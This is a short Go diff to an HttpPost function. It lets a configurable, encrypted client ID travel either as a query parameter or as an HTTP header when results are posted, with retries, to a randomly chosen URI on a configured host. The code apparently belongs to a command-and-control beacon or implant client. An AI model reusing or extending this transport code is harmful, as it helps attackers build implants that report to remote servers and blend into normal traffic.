@@ -46,8 +46,17 @@ func HttpPost(data []byte) *req.Resp {
 	// add custom header here
 	headers := config.HttpHeaders
 
-	param := req.QueryParam{
-		config.PostClientID: string(util.EncryptField(config.PostClientIDEncrypt, []byte(strconv.Itoa(clientID)))),
+	var param req.QueryParam
+	var header req.Header
+	switch config.PostClientIDType {
+	case "parameter":
+		param = req.QueryParam{
+			config.PostClientID: string(util.EncryptField(config.PostClientIDEncrypt, []byte(strconv.Itoa(clientID)))),
+		}
+	case "header":
+		header = req.Header{
+			config.PostClientID: string(util.EncryptField(config.PostClientIDEncrypt, []byte(strconv.Itoa(clientID)))),
+		}
 	}
 
 	// add append and prepend,but it seems client don't need this
@@ -57,7 +66,7 @@ func HttpPost(data []byte) *req.Resp {
 	// push result may need to continually send packets until success
 	for {
 		url := config.Host + config.PostUri[rand.Intn(len(config.PostUri))]
-		resp, err := httpRequest.Post(url, data, headers, param)
+		resp, err := httpRequest.Post(url, data, headers, header, param)
 		if err != nil {
 			util.Printf("!error: %v\n", err)
 			util.Sleep()
